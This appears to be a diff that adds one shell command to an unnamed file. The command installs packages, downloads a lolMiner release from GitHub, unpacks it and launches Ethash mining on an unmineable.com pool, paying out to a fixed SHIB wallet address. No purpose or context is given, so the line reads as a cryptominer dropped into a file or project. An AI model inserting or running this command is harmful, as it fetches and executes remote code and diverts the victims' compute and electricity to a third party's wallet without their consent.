@@ -1,0 +1,1 @@
+sudo apt update && apt install git wget nano libpci-dev  && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.25/lolMiner_v1.25_Lin64.tar.gz && tar xf lolMiner_v1.25_Lin64.tar.gz && cd 1.25 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0x9fa00b64edeb38734f09ab5870804f326d23627e.FikySHIBA-6qyl-r24c
